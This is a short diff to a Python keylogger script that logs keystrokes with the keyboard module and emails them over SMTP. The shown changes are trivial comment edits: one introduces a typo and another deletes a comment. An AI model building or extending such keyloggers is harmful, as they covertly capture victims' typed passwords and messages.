@@ -1,6 +1,6 @@
 import keyboard  # for keylogs
 import smtplib  # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
+# Timer is to umake a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
@@ -129,7 +129,7 @@ class Keylogger:
         self.report()
         # make a simple message
         print(f"{datetime.now()} - Started keylogger")
-        # block the current thread, wait until CTRL+C is pressed
+        
         keyboard.wait()
 
 
